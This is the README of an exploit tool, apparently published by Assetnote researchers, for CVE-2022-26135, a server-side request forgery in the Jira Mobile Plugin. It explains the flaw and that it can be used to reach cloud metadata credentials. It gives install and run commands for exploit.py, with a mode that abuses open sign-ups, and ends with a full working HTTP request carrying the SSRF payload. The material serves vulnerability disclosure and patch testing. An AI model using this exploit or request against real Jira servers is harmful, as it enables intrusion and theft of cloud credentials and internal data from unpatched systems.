# CVE-2022-26135 - Full-Read Server Side Request Forgery in Mobile Plugin for Jira Data Center and Server

## About Assetnote

Assetnote automatically maps your external assets and monitors them for changes and security issues to help prevent serious breaches.

This research was performed by Assetnote's Security Research team.

You can read more about our product and our team at [https://assetnote.io](https://assetnote.io).

## Blog Post

The blog post detailing the steps taken for the discovery of this vulnerability can be found [here](https://blog.assetnote.io/2022/06/26/exploiting-ssrf-in-jira/).

## Description

Jira Core & Jira Service Desk are vulnerable to server-side request forgery after authenticating. In some cases, it is possible to leverage open sign ups in Jira Core or Jira Service Desk to exploit this server-side request forgery flaw without having known credentials.

## Impact

The SSRF vulnerability allows attackers to send HTTP requests using any HTTP method, headers and body to arbitrary URLs. When Jira is deployed on a cloud environment, an attacker can leverage this exploit chain to obtain cloud credentials or other sensitive information through the metadata IP address.

## Affected Software

As per the advisory from Atlassian, please see the following knowledge base article to confirm if you are running an affected software version: [https://confluence.atlassian.com/jira/jira-server-security-advisory-29nd-june-2022-1142430667.html](https://confluence.atlassian.com/jira/jira-server-security-advisory-29nd-june-2022-1142430667.html)

# Usage Instructions

```
pip3 install -r requirements.txt
```

and then you can use the exploit using:

```
python3 exploit.py
```

Help:

```
usage: exploit.py [-h] --target TARGET --ssrf SSRF --mode MODE [--software SOFTWARE] [--username USERNAME] [--email EMAIL] [--password PASSWORD]

optional arguments:
  -h, --help           show this help message and exit
  --target TARGET      i.e. http://re.local:8090
  --ssrf SSRF          i.e. example.com (no protocol pls)
  --mode MODE          i.e. manual or automatic - manual mode you need to provide user auth info
  --software SOFTWARE  i.e. jira or jsd - only needed for manual mode
  --username USERNAME  i.e. admin - only needed for manual jira mode
  --email EMAIL        i.e. admin@example.com - only needed for manual jira service desk mode
  --password PASSWORD  i.e. testing123 - only needed for manual mode
```

If you already have credentials for Jira / Jira Service Desk, then set the `--mode` to `manual` and the `--software` argument to either `jira` or `jsd`.

# HTTP Request

The following HTTP request can be used to reproduce this issue, once authenticated to the Jira instance:

```http
POST /rest/nativemobile/1.0/batch HTTP/2
Host: issues.example.com
Cookie: JSESSIONID=44C6A24A15A1128CE78586A0FA1B1662; seraph.rememberme.cookie=818752%3Acc12c66e2f048b9d50eff8548800262587b3e9b1; atlassian.xsrf.token=AES2-GIY1-7JLS-HNZJ_db57d0893ec4d2e2f81c51c1a8984bde993b7445_lin
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
Content-Type: application/json
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Origin: https://issues.example.com
Referer: https://issues.example.com/plugins/servlet/desk
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Length: 63

{"requests":[{"method":"GET","location":"@example.com"}]}
```